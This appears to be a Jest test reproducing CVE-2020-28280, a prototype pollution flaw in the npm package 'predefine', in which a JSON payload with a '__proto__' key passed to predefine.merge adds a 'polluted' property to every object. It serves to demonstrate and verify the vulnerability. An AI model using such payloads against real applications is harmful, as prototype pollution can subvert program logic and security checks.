//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2020-28280
test("prototype pollution in predefine", () => {
    
    var predefine = require("predefine");
    obj = {};
    const payload = JSON.parse('{"__proto__":{"polluted":"yes"}}');

    expect({}.polluted).toBe(undefined);
    
    predefine.merge({}, payload);
    expect({}.polluted).toBe("yes");
  });
  
